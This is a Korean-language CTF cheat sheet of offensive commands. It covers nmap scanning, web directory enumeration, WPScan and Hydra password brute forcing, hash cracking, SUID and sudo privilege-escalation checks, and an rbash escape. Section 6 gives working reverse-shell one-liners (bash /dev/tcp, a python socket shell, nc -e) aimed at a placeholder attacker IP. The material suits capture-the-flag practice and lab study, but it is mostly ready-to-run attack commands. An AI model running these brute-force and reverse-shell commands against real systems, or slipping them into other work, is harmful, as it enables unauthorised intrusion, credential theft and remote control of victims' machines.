## 🗺️ CTF 필수 명령어 총정리

---

### 📡 1. 정찰 (Reconnaissance)

```bash
# 네트워크에서 살아있는 호스트 찾기
nmap -sn 192.168.1.0/24

# 전체 포트 + 서비스 + 스크립트 스캔
nmap -sC -sV -Pn -p- 192.168.1.100

# 결과를 파일로 저장
nmap -sC -sV -Pn -p- 192.168.1.100 -oN scan.txt
```

---

### 🕷️ 2. 웹 디렉토리 열거

```bash
# gobuster 기본
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 확장자 포함
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,log,bak -t 80 --no-error

# dirb (간단 버전)
dirb http://target.com
```

---

### 🔑 3. 패스워드 공격

```bash
# CeWL로 사이트 맞춤 wordlist 생성
cewl http://target.com -w wordlist.txt

# WPScan WordPress 브루트포스
wpscan --url http://target.com -U users.txt -P wordlist.txt --password-attack wp-login

# WordPress 사용자 열거
wpscan --url http://target.com -e u

# Hydra SSH 브루트포스
hydra -l admin -P wordlist.txt ssh://192.168.1.100

# John the Ripper 해시 크랙
john hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 📁 4. 파일 & 사용자 탐색

```bash
# 로그인 가능한 사용자 확인
cat /etc/passwd | grep bash

# 특정 사용자 소유 파일 전체 탐색
find / -user username -type f -exec ls -al {} \; 2>/dev/null

# SUID 비트 설정된 파일 찾기 (권한상승 힌트)
find / -perm -4000 -type f 2>/dev/null

# 쓰기 가능한 디렉토리 찾기
find / -writable -type d 2>/dev/null

# sudo 권한 확인 (권한상승 핵심!)
sudo -l
```

---

### 🐚 5. 쉘 탈출 & 환경 복구

```bash
# rbash 탈출 (vi 이용)
vi
  :set shell=/bin/sh
  :shell

# PATH 복구
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash

# python으로 bash 업그레이드
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 🔗 6. 리버스 쉘

```bash
# 공격자 머신에서 리스너 열기
nc -lvnp 4444

# 타겟에서 연결 (bash)
bash -i >& /dev/tcp/공격자IP/4444 0>&1

# 타겟에서 연결 (python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("공격자IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# nc로 연결
nc -e /bin/bash 공격자IP 4444
```

---

### 🔐 7. 해시 & 인코딩

```bash
# base64 디코딩
echo "인코딩된문자열" | base64 -d

# base64 인코딩
echo "텍스트" | base64

# 해시 확인
hash-identifier
```

---

### 🌐 8. FTP / SSH

```bash
# FTP 익명 로그인
ftp 192.168.1.100 [포트]
# Name: anonymous / Password: 엔터

# FTP 파일 다운로드
ftp> get 파일명

# SSH 접속
ssh user@192.168.1.100
ssh user@192.168.1.100 -p 포트번호
```

---
